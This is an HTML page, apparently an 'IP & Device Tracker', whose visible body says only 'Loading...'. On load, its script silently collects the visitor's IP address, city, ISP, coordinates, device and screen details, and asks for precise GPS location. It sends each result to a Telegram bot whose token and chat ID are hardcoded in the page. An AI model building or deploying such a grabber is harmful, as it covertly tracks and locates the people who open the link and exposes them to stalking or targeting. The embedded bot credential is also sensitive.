<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto IP & Device Tracker</title>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            fetch("https://api64.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    getIPDetails(data.ip);
                })
                .catch(error => console.error("Error fetching IP:", error));
        });

        function getIPDetails(ip) {
            fetch(`https://ip-api.com/json/${ip}`)
                .then(response => response.json())
                .then(ipData => {
                    if (ipData.status === "fail") return;

                    const deviceInfo = getDeviceInfo();
                    let message = `
                        🌍 IP: ${ipData.query}
                        🏳 Country: ${ipData.country}
                        🏙 City: ${ipData.city}
                        🏢 ISP: ${ipData.isp}
                        🌍 Lat: ${ipData.lat}, Lon: ${ipData.lon}
                        📱 Device: ${deviceInfo}
                    `;

                    sendToTelegram(message);

                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                let locationDetails = `
                                    📍 GPS Location:
                                    Latitude: ${position.coords.latitude}
                                    Longitude: ${position.coords.longitude}
                                `;
                                sendToTelegram(locationDetails);
                            },
                            error => console.log("Geolocation error:", error)
                        );
                    }
                })
                .catch(error => console.error("Error fetching IP details:", error));
        }

        function getDeviceInfo() {
            return `${navigator.userAgent} (Screen: ${screen.width}x${screen.height})`;
        }

        function sendToTelegram(message) {
            const botToken = "8168694027:AAEd-uBNjblJM74OkQnmlAZ_3Fh99SUkD8g";
            const chatId = "7182702425";

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(error => console.error("Telegram Error:", error));
        }
    </script>
</head>
<body>
    <h2>Loading...</h2>
</body>
</html>
